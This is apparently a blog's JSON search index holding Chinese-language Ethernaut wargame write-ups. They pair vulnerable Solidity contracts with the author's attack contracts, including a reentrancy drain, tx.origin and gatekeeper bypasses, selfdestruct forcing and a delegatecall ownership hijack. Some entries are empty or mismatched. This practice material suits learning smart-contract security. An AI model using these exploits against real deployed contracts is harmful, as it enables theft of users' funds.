[{"title":"就像冬天下雪，不算多特别","url":"//news/","content":"\n\n","categories":["Introduce"],"tags":["Arknights"]},{"title":"Ethernaut Test-2","url":"/2024/08/11/ETH02/","content":"Test 2-Fallout// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Fallback &#123;  mapping(address =&gt; uint) public contributions;  address public owner;  constructor() &#123;    owner = msg.sender;    contributions[msg.sender] = 1000 * (1 ether);  &#125;  modifier onlyOwner &#123;        require(            msg.sender == owner,            &quot;caller is not the owner&quot;        );        _;    &#125;  function contribute() public payable &#123;    require(msg.value &lt; 0.001 ether);    contributions[msg.sender] += msg.value;    if(contributions[msg.sender] &gt; contributions[owner]) &#123;      owner = msg.sender;    &#125;  &#125;  function getContribution() public view returns (uint) &#123;    return contributions[msg.sender];  &#125;  function withdraw() public onlyOwner &#123;    payable(owner).transfer(address(this).balance);  &#125;  receive() external payable &#123;    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);    owner = msg.sender;  &#125;&#125;\n\n\n题目的要求是 获取该合约的所有权\n\n观察这个合约，我们可以发现该合约使用的 solidity 版本为 0.6.0，而在这个版本中我们要声明一个构造函数的方式和 0.8 版本中的方式是不同的\n//0.8版本及以上contract Example&#123;\tconstructor() &#123;&#125;&#125;//0.6版本（包含以下）contract Example&#123;\tfunction Example() &#123;\t&#125;&#125;//即在0.6这个版本中，我们需要构造函数的名称与合约的名称一致\n\n那么在这道题中，有的盲生可能就发现了华点\n\n我们的合约名称与“构造”的这个函数名称并不一致！一个是 Fallout，一个是 Fal1out。也就是说，这并不是一个构造函数，而是一个普通函数，这也是整个合约报错的原因！\n\n在这个函数中，owner 被设置为部署合约的人，那么怎么获取合约的所有权呢\n\n\n因为这是一个可以调用的公用函数，所以我们可以调用它，这样就能获得合约的所有权\n我们要声明一个接口，用于调用这个公用函数 Fal1out\n\n// SPDX-License-Identifier: MITpragma solidity ^0.8;interface Fallout &#123;    function owner() external view returns(address);    function Fal1out() external payable;&#125;\n\n\n回到 eth 靶场，打开浏览器控制台获取合同的地址\n在 At Address 中填入获得到的合同地址，并部署合约\n调用 Fal1out 这个函数，等待交易完成后查看 owner 是否被更改为我们的地址\n完成解题\n\n\n\n","categories":["Ethernaut"],"tags":["Test"]},{"title":"Ethernaut Test-1","url":"/2024/08/11/ETH01/","content":"Test 1-Fallback// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Fallback &#123;  mapping(address =&gt; uint) public contributions;  address public owner;  constructor() &#123;    owner = msg.sender;    contributions[msg.sender] = 1000 * (1 ether);  &#125;  modifier onlyOwner &#123;        require(            msg.sender == owner,            &quot;caller is not the owner&quot;        );        _;    &#125;  function contribute() public payable &#123;    require(msg.value &lt; 0.001 ether);    contributions[msg.sender] += msg.value;    if(contributions[msg.sender] &gt; contributions[owner]) &#123;      owner = msg.sender;    &#125;  &#125;  function getContribution() public view returns (uint) &#123;    return contributions[msg.sender];  &#125;  function withdraw() public onlyOwner &#123;    payable(owner).transfer(address(this).balance);  &#125;  receive() external payable &#123;    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);    owner = msg.sender;  &#125;&#125;\n\n\n题目的要求是 1.获取该合约的所有权 2.将合约中的余额清零\n\n那么我们一个一个来\n1.首先是获取合约所有权，我们可以看到 owner 这个状态变量，在最后一行中的\nowner = msg.sender;//说明要获得这个合约的所有权，我们必须要向其发送&gt;=0的ether//合约中的contributions[msg.sender]给我提供了一个方向，就是去寻找这个contribution的状态变量，果然我找到了一个函数contribute，通过调用这个函数，我们就可以向该合约发送ether，接着再调用receive函数，这样就能将合约的拥有者设置为我们自己\n\n2.然后是将合约中的余额清零，这个好办，在完成第一步后直接调用 withdraw 函数就 ok 了\n\n注意事项\n\n在部署合约前，在 eth 靶场的界面用 f12 打开控制台输入 contract.address 获得部署地址，部署时在“At Address”这一栏中填入\n在部署完成后的界面中，并没有 receive 这个按钮，这个时候通过 low level interractions 功能，再次发送一个 eth，调用 receive 函数\n上述操作完成后记得验证 owner 是否已经被更改为我们的地址\n\n\n\n","categories":["Ethernaut"],"tags":["Test"]},{"title":"Ethernaut Test-3","url":"/2024/08/11/ETH03/","content":"Test 3-Coin Flip// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract CoinFlip &#123;  uint256 public consecutiveWins;  uint256 lastHash;  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;  constructor() &#123;    consecutiveWins = 0;  &#125;  function flip(bool _guess) public returns (bool) &#123;    uint256 blockValue = uint256(blockhash(block.number - 1));    if (lastHash == blockValue) &#123;      revert();    &#125;    lastHash = blockValue;    uint256 coinFlip = blockValue / FACTOR;    bool side = coinFlip == 1 ? true : false;    if (side == _guess) &#123;      consecutiveWins++;      return true;    &#125; else &#123;      consecutiveWins = 0;      return false;    &#125;  &#125;&#125;\n\n\n题目的要求是 “猜硬币”，并连续 10 次猜对结果\n\n\n分析这段合约的时候我们看出，在我们调用 flip 这个函数时，consecutiveWins 会递增。consecutiveWins 增加的条件是输入的猜测结果 guess 等于 合约内部执行的计算结果 side\n\n如果我们的猜测结果连续十次与变量 side 相等，就赢得了这个挑战\n\n我们先创建一个名为 hack 的合约，在这个合约中传入 coinflip 的地址，将其命名为 target\n再建立一个构造函数，用来设定 target 变量\ncontract Hack &#123;    CoinFlip private immutable target;    constructor(address _target) &#123;        target = CoinFlip(_target);    &#125;\n\n接下来我们声明一个函数，并连续调用它十次，这样可以连续十次增加胜利次数\n我们命名这个函数为 flip\nfunction flip() external &#123;      bool guess = _guess(); //这里调用一个内部函数_guess，用来猜测结果      require(target.flip(guess), &quot;guess failed&quot;); //用require来判定结果是否正确    &#125;function _guess() private view returns(bool)&#123;//那么问题来了，怎么才能保证猜测结果始终正确呢&#125;\n\n我们翻一下源代码，发现了计算猜测结果的函数，删去不需要的部分后，放入_guess 这个内部函数中\n得到的结果\nfunction flip() external &#123;      bool guess = _guess();      require(target.flip(guess), &quot;guess failed&quot;);    &#125;    function _guess() private view returns(bool) &#123;    uint256 blockValue = uint256(blockhash(block.number - 1));    uint256 coinFlip = blockValue / FACTOR;    bool side = coinFlip == 1 ? true : false;    return side;    &#125;    //这里的计算过程有个FACTOR，我们把源代码中的这个值粘贴到hack合约中，得到最后的结果\n\ncontract Hack &#123;    CoinFlip private immutable target;    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;    constructor(address _target) &#123;        target = CoinFlip(_target);    &#125;    function flip() external &#123;      bool guess = _guess();      require(target.flip(guess), &quot;guess failed&quot;);    &#125;    function _guess() private view returns(bool) &#123;    uint256 blockValue = uint256(blockhash(block.number - 1));    uint256 coinFlip = blockValue / FACTOR;    bool side = coinFlip == 1 ? true : false;    return side;    &#125;&#125;\n\n这个时候再连续调用十次 flip 函数，即可完成这个挑战\n","categories":["Ethernaut"],"tags":["Test"]},{"title":"Ethernaut Test-4","url":"/2024/08/11/ETH04/","content":"Test 4-Telephone// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Telephone &#123;  address public owner;  constructor() &#123;    owner = msg.sender;  &#125;  function changeOwner(address _owner) public &#123;    if (tx.origin != msg.sender) &#123;      owner = _owner;    &#125;  &#125;&#125;\n\n%localappdata%\n\n目标：获取合约的所有权\n\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Telephone &#123;  address public owner;  constructor() &#123;    owner = msg.sender;  &#125;  function changeOwner(address _owner) public &#123;    if (tx.origin != msg.sender) &#123;      owner = _owner;    &#125;  &#125;&#125;\n\n我们找到其中的changeOwner函数，并寻找 owner 在哪些地方能被变更，然后我们发现在构造函数constructor里将 owner 设置为这个合约的部署者\n在changeOwner函数中，它接受一个输入，并将 owner 这个状态变量设置为新的所有者的地址\n而它需要满足条件**tx.origin !&#x3D; msg.sender**\n什么意思呢 我们回顾一下：\n\ntx.origin 是发起交易的账户\nmsg.sender 是当前直接调用这个合约的即时账户\n\n要完成目标，我们可以先创建一个攻击合约，用来调用 Telephone 合约，这样 tx.origin 将是我们的账户，而 msg.sender 将是攻击合约，以此来达成条件**tx.origin !&#x3D; msg.sender**\n编写攻击合约contract Hack&#123;\tconstructor(address _target)&#123;\t\tTelephone(_target).changeOwner(msg.sender);\t&#125;&#125;\n\n之后我们向 Telephone 合约的地址部署 Hack 合约，即可完成挑战\n","categories":["Ethernaut"],"tags":["Test"]},{"title":"Ethernaut Test-5","url":"/2024/08/11/ETH05/","content":"// SPDX-License-Identifier: MITpragma solidity ^0.8.0;interface IToken &#123;    function balanceOf(address) external view returns (uint256);    function transfer(address to , uint256 value) external returns (bool);&#125;contract Hack &#123;    constructor(address _target) &#123;        IToken(_target).transfer(msg.sender,1);    &#125;&#125;\n\n","categories":["Ethernaut"],"tags":["Test"]},{"title":"Ethernaut Test-6","url":"/2024/08/11/ETH06/","content":"// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Delegate &#123;  address public owner;  constructor(address _owner) &#123;    owner = _owner;  &#125;  function pwn() public &#123;    owner = msg.sender;  &#125;&#125;contract Delegation &#123;  address public owner;  Delegate delegate;  constructor(address _delegateAddress) &#123;    delegate = Delegate(_delegateAddress);    owner = msg.sender;  &#125;  fallback() external &#123;    (bool result,) = address(delegate).delegatecall(msg.data);    if (result) &#123;      this;    &#125;  &#125;&#125;\n","categories":["Ethernaut"],"tags":["Test"]},{"title":"Ethernaut Test-7","url":"/2024/08/11/ETH07/","content":"// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Force &#123;/*                   MEOW ?         /\\_/\\   /    ____/ o o \\  /~____  =ø= / (______)__m_m)*/&#125;//可能我们需要往这个合约里发送一些ETH？//——&gt;创建一个转账合约(错误)//这是一个空合约，你创建牛魔呢，这里提到一个新名词//selfdestruct —— 自毁合约功能 //通过这个功能删除一个合约，然后这个合约内所有的余额将被强制发送到另一个合约contract Hack &#123;    constructor(address payable _target) payable &#123;        selfdestruct(_target);    &#125;&#125;\n","categories":["Ethernaut"],"tags":["Test"]},{"title":"Ethernaut Test-8","url":"/2024/08/11/ETH08/","content":"// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Vault &#123;  bool public locked;  bytes32 private password; //这是一个私有变量，所以我们不能直接获取密码 但是可以访问它  constructor(bytes32 _password) &#123;    locked = true;    password = _password;  &#125;  function unlock(bytes32 _password) public &#123;    if (password == _password) &#123;      locked = false;    &#125;  &#125;&#125;//当合约被部署时，lock被设置为true//想办法将locked设置为false ---unlock函数//为了获取password，我们需要返回访问Web3库//password 0x412076657279207374726f6e67207365637265742070617373776f7264203a29\n\n","categories":["Ethernaut"],"tags":["Test"]},{"title":"Ethernaut Test-9","url":"/2024/08/11/ETH09/","content":"\n","categories":["Ethernaut"],"tags":["Test"]},{"title":"Ethernaut Test-10","url":"/2024/08/11/ETH10/","content":"// SPDX-License-Identifier: MITpragma solidity ^0.8.0;interface IReentrancy &#123;  function donate(address) external payable;  function withdraw(uint256) external;&#125;contract Hack &#123;  IReentrancy private immutable target;  constructor(address _target) &#123;    target = IReentrancy(_target);  &#125;  function attack() external payable &#123;    target.donate&#123;value: 1e18&#125;(address(this)); //我们所donate的余额。再执行withdraw，以实现重入攻击    target.withdraw(1e18);    require(address(target).balance == 0, &#x27;target balance &gt; 0&#x27;); //当我们把所有的eth取走后    selfdestruct(payable(msg.sender)); //提取完后，攻击合约进行自毁  &#125;  receive() external payable &#123;    uint amount = min(1e18, address(target).balance); //将amount设置为最大的balance，也就是原合约中所有的资产    if (amount &gt; 0) &#123;      target.withdraw(amount); //在amount没有到0的情况下一直执行，直到提取完所有的资金    &#125;  &#125;  function min(uint x, uint y) private pure returns (uint) &#123;    //这个函数将会返回x，y中的最小值    return x &lt;= y ? x : y;  &#125;&#125;\n","categories":["Ethernaut"],"tags":["Test"]},{"title":"Ethernaut Test-11","url":"/2024/08/11/ETH11/","content":"// SPDX-License-Identifier: MITpragma solidity ^0.8.0;interface Building &#123;    function isLastFloor(uint) external returns (bool);&#125;contract Hack &#123;    Elevator private immutable target;    uint private count;    constructor(address _target) &#123;        target = Elevator(_target);    &#125;    function pwn() external &#123;        //部署pwn函数，在pwn函数中我们已经验证了调用结果是否为true        target.goTo(1);        require(target.top(), &quot;not top&quot;);    &#125;    function isLastFloor(uint) external returns (bool) &#123;        //需要创建一个count函数，来记录调用isLastFloor这个函数的次数        count++;        return count &gt; 1; //这样才能做到第一次调用返回false，第二次返回true        //实现的方式 第一次count将等于1返回false，第二次count为2大于1返回true    &#125;&#125;contract Elevator &#123;    bool public top; //top 是一个 bool 变量，我们需要将其设置为 true    uint public floor;    function goTo(uint _floor) public &#123;        //一个可调用的函数，它接收一个 floor 输入        Building building = Building(msg.sender); //上面的 interface 接口表明，最后会返回一个 bool，我们要做的就是让这个 bool 为 true        if (!building.isLastFloor(_floor)) &#123;            //而building，是一个加载调用者地址的接口。稍后，该接口会两次调用isLastFloor函数            floor = _floor;            top = building.isLastFloor(floor); //要达成这个挑战，第一次对isLastFloor的调用必须返回false，第二次必须返回true        &#125;    &#125;&#125;//挑战目标：到达 top floor","categories":["Ethernaut"],"tags":["Test"]},{"title":"Ethernaut Test-10-interface","url":"/2024/08/11/ETH10-interface/","content":"// SPDX-License-Identifier: MITpragma solidity ^0.6.12;import &#x27;openzeppelin-contracts-06/math/SafeMath.sol&#x27;;contract Reentrance &#123;  using SafeMath for uint256;  mapping(address =&gt; uint) public balances;  function donate(address _to) public payable &#123;    balances[_to] = balances[_to].add(msg.value);  &#125;  function balanceOf(address _who) public view returns (uint balance) &#123;    return balances[_who];  &#125;  function withdraw(uint _amount) public &#123;    //该 withdraw 函数：一个典型的重入攻击（详情参看我在 gitee 中保存的重入攻击文档）    if (balances[msg.sender] &gt;= _amount) &#123;      //如果 msg.sender 的余额大于等于指定的金额，则可以取出它们      (bool result, ) = msg.sender.call&#123;value: _amount&#125;(&#x27;&#x27;); //当调用 msg.sender.call 时，将会把输入的金额从合约中发送出去 然后更新余额      if (result) &#123;        _amount;      &#125;      balances[msg.sender] -= _amount;    &#125;  &#125;  receive() external payable &#123;&#125;&#125;//挑战的目标是盗取这个合约中的所有资金//重入攻击，不断调用取走资金的函数，直到所有的资产都被搬空\n","categories":["Ethernaut"],"tags":["Test"]},{"title":"Ethernaut Test-12","url":"/2024/08/11/ETH12/","content":"// SPDX-License-Identifier: MITpragma solidity ^0.8.0;//每个私有变量都有一个slot来储存它，每个slot可以储存32个字节的数据，我们可以通过uint的类型判断其占用几个字节，再计算出这个状态变量会被储存在哪个slot当中contract Privacy &#123;  //slot 0  bool public locked = true;  //slot 1  uint256 public ID = block.timestamp;  //slot 2  uint8 private flattening = 10;  //slot 2  uint8 private denomination = 255;  //slot 2  uint16 private awkwardness = uint16(block.timestamp);  //slot 3(开辟了一个新的数组) 接下来该数组中的变量被依次储存到 slot 4 -&gt; slot 5（第二个元素） 我们可以使用web3.js库来获取数据  bytes32[3] private data; //由于该变量是私有的，所以不能直接调用来获取key  constructor(bytes32[3] memory _data) &#123;    data = _data;  &#125;  function unlock(bytes16 _key) public &#123;    //这里是我们能调用的一个函数 unlock    require(_key == bytes16(data[2])); //要调用它，需要输入一个参数key，这个参数key为状态变量data中的第二个元素    locked = false;    //通过调用web3.js库我们获得了key ‘0xa6e187e9680ec7e8c6e6dd0b474a9185’  &#125;  /*    A bunch of super advanced solidity algorithms...      ,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`      .,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,      *.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^         ,---/V\\      `*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.    ~|__(o.o)      ^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;  UU  UU  */&#125;//挑战的目标是解锁这个合约，也就是需要将locked这个变量的值设置为false//**调用web3.js库的过程如下**//图片没了 到时候再看吧\n","categories":["Ethernaut"],"tags":["Test"]},{"title":"Ethernaut Test-13","url":"/2024/08/11/ETH13/","content":"// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Hack &#123;  function enter(address _target, uint gas) external &#123;    GatekeeperOne target = GatekeeperOne(_target);    //k = uint64(_gateKey) //需要创建一个满足下列条件的gateKey    uint16 k16 = uint16(uint160(tx.origin));    //uint32(k) != k //这是剩下的需要满足的条件 &gt;&gt; 我们注意到k=uint64 所以如果我们在这个数字的最左边加上1 然后将其转换为uint32类型 这样最左边加的1将被移除 两边不再相等    //uint32(k) == uint16(uint160(tx.origin)) //我们需要定义一个满足这个条件的k    //uint32(k) == uint16(k) //由于转换为了uint16 所以这个条件也满足了    uint64 k64 = uint64(1 &lt;&lt; 63) + uint64(k16); //最后一步是将这个uint64转换为bytes8    bytes8 key = bytes8(k64);    require(gas &lt; 8191, &#x27;gas &gt;= 8191&#x27;);    require(target.enter&#123;gas: 8191 * 10 + gas&#125;(key), &#x27;failed&#x27;); //将key作为input传入 在之前要先定义    //这样就成功完成了GateOne  &#125;&#125;contract GatekeeperOne &#123;  address public entrant;  //三层的gate，也就是有三重条件  modifier gateOne() &#123;    require(msg.sender != tx.origin); //msg.sender是调用合约的地址 tx.origin是发起交易的账户    _; //要使这两个地址不相等，我们只需要创建一个hack合约调用enter函数 这样msg.sender就是hack合约的地址  &#125;  modifier gateTwo() &#123;    require(gasleft() % 8191 == 0); //要求 在执行这部分代码时剩余的gas数量必须能被8191整除    _;    //在hack合约里加入一个测试 并多次运行测试 使用不同的gas量直到通过gatetwo\\    //经过计算遍历后 我们需要的gas数量是256  &#125;  modifier gateThree(bytes8 _gateKey) &#123;    require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &#x27;GatekeeperOne: invalid gateThree part one&#x27;);    require(uint32(uint64(_gateKey)) != uint64(_gateKey), &#x27;GatekeeperOne: invalid gateThree part two&#x27;);    require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), &#x27;GatekeeperOne: invalid gateThree part three&#x27;);    _;  &#125;  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;    entrant = tx.origin;    return true;  &#125;&#125;//Target : Make it past the gatekeeper and register as an entrant","categories":["Ethernaut"],"tags":["Test"]},{"title":"Ethernaut Test-15","url":"/2024/08/11/ETH15/","content":"","categories":["Ethernaut"],"tags":["Test"]},{"title":"Ethernaut Test-14","url":"/2024/08/11/ETH14/","content":"// SPDX-License-Identifier: MITpragma solidity ^0.8.0;//0x93f7daCE54CEE6E71138E4F633DD7BD143D13aa2contract Hack &#123;  constructor(GatekeeperTwo target) &#123;    uint64 s = uint64(bytes8(keccak256(abi.encodePacked(address(this))))); //设置一个变量s代替这个等式的前半部分    uint64 k = s ^ type(uint64).max;    // ^ uint64(key) == type(uint64).max)  //使用_gateKey进行异或运算 这样得到的结果命名为key 在这里面    //max = 11...11    //s ^ key = max 异或运算    //s ^ s ^ key = key = s ^ max    // 异或运算只有在两个数的其中一个数为一时才返回1    // a ^ a ^ b = b    bytes8 key = bytes8(k); //这样就通过了gateThree    require(target.enter(key), &#x27;failed&#x27;);  &#125;&#125;contract GatekeeperTwo &#123;  address public entrant;  modifier gateOne() &#123;    require(msg.sender != tx.origin);    _;    //这个也同上一题  &#125;  modifier gateTwo() &#123;    uint x;    assembly &#123;      x := extcodesize(caller())    &#125;    require(x == 0); //要求extcodesize...必须等于零 （好像意思是在说msg.sender不能是一个合约？）    _;  &#125;  modifier gateThree(bytes8 _gateKey) &#123;    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);    _;  &#125;  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;    entrant = tx.origin;    return true;    //我们需要达成gate123的要求 enter这个函数接收一个key  &#125;&#125;//类似于上一题，需要我们成功注册通行证，也就是要将状态变量entrant设置为我们的账户","categories":["Ethernaut"],"tags":["Test"]},{"title":"Ethernaut Test-16","url":"/2024/08/11/ETH16/","content":"// SPDX-License-Identifier: MITpragma solidity ^0.8.0;//target: claim ownership of the instance.contract Hack &#123;    address public timeZone1Library;    address public timeZone2Library;    address public owner;    function attack(        Preservation target //solidity在这里会用接口Preservation加载目标地址 而不是将Pre...合约的地址传递到函数中    ) external &#123;        target.setFirstTime(uint256(uint160(address(this))));        target.setFirstTime(uint256(uint160(msg.sender)));        require(target.owner() == msg.sender, &quot;hack failed&quot;);    &#125;    function setTime(uint _owner) external &#123;        owner = address(uint160(_owner));    &#125;&#125;contract Preservation &#123;    // public library contracts    address public timeZone1Library;    address public timeZone2Library;    address public owner;    uint256 storedTime;    // Sets the function signature for delegatecall    bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;));    constructor(        address _timeZone1LibraryAddress,        address _timeZone2LibraryAddress    ) &#123;        timeZone1Library = _timeZone1LibraryAddress;        timeZone2Library = _timeZone2LibraryAddress;        owner = msg.sender; //唯一可以找到的设置owner的位置 看一下下方函数有什么可以调用的    &#125;    // set the time for timezone 1    function setFirstTime(uint256 _timeStamp) public &#123;        //如果我们调用这个函数 它将更新timeZone1Library的地址        timeZone1Library.delegatecall(            abi.encodePacked(setTimeSignature, _timeStamp)        ); //delegatecall的概念 合约A（主）通过合约B调用合约C    &#125; //在这个函数中的表现形式就是通过委托调用setTimeSignature函数（合约B）-&gt; 再调用setTime函数    // set the time for timezone 2    function setSecondTime(uint256 _timeStamp) public &#123;        timeZone2Library.delegatecall(            abi.encodePacked(setTimeSignature, _timeStamp)        );    &#125;&#125;// Simple library contract to set the timecontract LibraryContract &#123;    // stores a timestamp    uint256 storedTime;    function setTime(uint256 _time) public &#123;        storedTime = _time;    &#125;&#125;","categories":["Ethernaut"],"tags":["Test"]}]